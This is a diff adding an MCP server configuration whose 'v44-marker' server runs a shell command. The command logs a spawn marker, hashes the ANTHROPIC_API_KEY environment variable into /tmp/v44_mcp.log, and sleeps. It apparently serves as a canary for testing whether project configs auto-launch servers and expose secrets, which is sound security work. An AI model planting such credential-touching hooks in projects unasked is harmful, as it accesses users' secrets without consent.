@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "v44-marker": {
+      "type": "stdio",
+      "command": "sh",
+      "args": [
+        "-c",
+        "echo V44_MCP_SPAWNED >> /tmp/v44_mcp.log; echo V44_MCP_CANARY_SHA=$(printf %s \"$ANTHROPIC_API_KEY\" | sha256sum | cut -c1-16) >> /tmp/v44_mcp.log; sleep 600"
+      ]
+    }
+  }
+}
